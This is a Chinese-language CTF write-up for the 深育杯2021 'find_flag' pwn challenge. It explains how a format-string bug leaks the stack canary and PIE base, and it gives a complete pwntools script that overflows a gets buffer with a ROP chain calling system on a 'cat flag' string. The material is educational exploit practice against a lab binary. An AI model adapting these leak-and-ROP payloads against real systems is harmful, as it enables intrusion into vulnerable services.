---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: 深育杯2021-find_flag-wp
date: 2023-06-20 20:27:23
tags:
- CTF
- pwn
- stack
- 深育杯2021
- nssctf
- str_format
- canary
categories:
- pwn-wp
---

## 0x1 分析

* 保护全开
* gets ---> printf ---> gets
* 明显栈溢出，首先想到填满然后泄露canary，但是gets会自动将\n替换为\0
* 应用格式化字符串漏洞泄露canary和随机化基地址
* system函数已在plt中
* 有cat flag字符串

![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/20/深育杯2021-find-flag-wp/0x1.png?raw=true)  

## 0x2 exp

1. 第一个gets，格式化字符串泄露canary和base 
2. 第二个gets，ROP

![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/20/深育杯2021-find-flag-wp/0x2.png?raw=true)  

```python
from pwn import *
import sys
pty = process.PTY
context(os='linux', log_level='debug')

mode = sys.argv[1] if len(sys.argv) > 1 else ''
if mode == 'r':
    proc = remote("node4.anna.nssctf.cn", 28372)
else:
    proc = process("./bin", stdin=pty, stdout=pty)

belf = ELF("./bin")


def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(x=0xfffffff): return proc.recv(x)
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

gscript = '''
    b main
    fin
    fin
    fin
    fin
    ni 80
'''
if mode == 'd':
    gdb.attach(proc, gdbscript=gscript)

# 格式化字符串泄露 canary和随机化base
sla(b'name? ', b'%p '*0x13)

ru(b', ')
t = ru(b'!\n').decode().split(' ')
print(t)

canary = int(t[-4], 16)
base = int(t[-2], 16)-0x146f
catflag_addr = base+0x2004
system_plt = base+belf.plt['system']
rdi_ret = base+0x00000000000014e3
ret = base+0x000000000000101a


ls("canary: "+hex(canary))
ls("catflag_addr: "+hex(catflag_addr))

# ROP
sl(b'h'*0x38 + p64(canary)+b'h'*8+p64(ret) +
    p64(rdi_ret)+p64(catflag_addr)+p64(system_plt))

pi()
pause()

```
